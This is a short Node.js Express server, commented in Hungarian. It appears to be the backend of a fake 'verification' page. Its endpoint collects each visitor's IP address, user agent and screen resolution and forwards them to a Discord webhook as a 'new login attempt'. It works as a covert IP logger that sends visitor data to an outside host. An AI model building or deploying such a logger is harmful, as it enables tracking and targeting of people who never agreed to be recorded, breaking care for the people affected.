const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();

// === ERŐSÍTETT CORS BEÁLLÍTÁS ===
app.use(cors({
    origin: [
        'https://hitelesites.netlify.app',
        'https://*.netlify.app',           // ha subdomain-öd van
        'http://localhost:3000',
        'http://127.0.0.1:5500',
        'http://localhost:5500'
    ],
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
    credentials: true,
    preflightContinue: false,
    optionsSuccessStatus: 204   // fontos néhány böngészőhöz
}));

// Explicit OPTIONS handler (biztonsági tartalék)
app.options('*', cors());

app.use(express.json({ limit: '10kb' }));

const WEBHOOK = process.env.DISCORD_WEBHOOK_URL;

const getClientIP = (req) => {
    return (req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip || 'Ismeretlen')
        .split(',')[0].trim();
};

app.post('/hitelesit', async (req, res) => {
    try {
        const { ua, res: resolution } = req.body;

        await axios.post(WEBHOOK, {
            embeds: [{
                title: "✅ Új Belépési Kísérlet",
                color: 0x00FF41,
                timestamp: new Date().toISOString(),
                fields: [
                    { name: "IP", value: getClientIP(req), inline: true },
                    { name: "User Agent", value: (ua || "Nincs adat").substring(0, 500), inline: false },
                    { name: "Képernyő", value: resolution || "Nincs adat", inline: true }
                ]
            }]
        });

        res.status(200).json({ status: "OK" });
    } catch (error) {
        console.error('Hiba:', error.message);
        res.status(500).json({ error: "Szerver hiba" });
    }
});

app.get('/health', (req, res) => res.json({ status: 'OK' }));

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Szerver fut: ${PORT}`);
    if (!WEBHOOK) console.error('❌ Nincs DISCORD_WEBHOOK_URL beállítva!');
});
